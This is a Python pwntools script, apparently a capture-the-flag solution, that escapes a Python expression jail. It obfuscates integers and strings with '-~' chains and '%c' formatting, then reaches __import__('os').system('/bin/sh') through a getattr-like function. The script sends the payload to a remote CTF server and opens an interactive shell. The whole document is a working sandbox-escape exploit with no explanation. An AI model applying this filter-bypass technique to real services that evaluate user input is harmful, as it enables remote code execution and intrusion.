from pwn import *

def construct_integer(n: int) -> str:
    if n < 1:
        raise ValueError("n must be >= 1")
    if n == 1:
        return "N"              # this is the True varible
    return "-~" * (n - 1) + "N"

def construct_string(exp: str) -> str:
    """
    return '%c%c%c' * len(exp) % (xx, xxx, xx)
    """
    fmt = "'" + "%c" * len(exp) + "'"
    exprs = ",".join(construct_integer(ord(c)) for c in exp)
    return f"{fmt} % ({exprs})"

def exp(obj: str, attr: str) -> str:
    return f"c({obj},{construct_string(attr)})"

init = f"N:=('A'<'B')"

import_str = construct_string("__import__")
os_str = construct_string("os")
system_str = construct_string("system")
sh_str = construct_string("/bin/sh")

step1 = exp("c","__self__")
step2 = f"c({step1},{import_str})({os_str})"
step3 = f"c({step2}, {system_str})({sh_str})"

payload = f"({init},{step3})"

print(f"length of payload: {len(payload)}")
print(payload)

io = remote('play.scriptsorcerers.xyz', 10337)

_ = io.recvuntil(b'Enter payload: ')
io.sendline(payload.encode())
io.interactive()
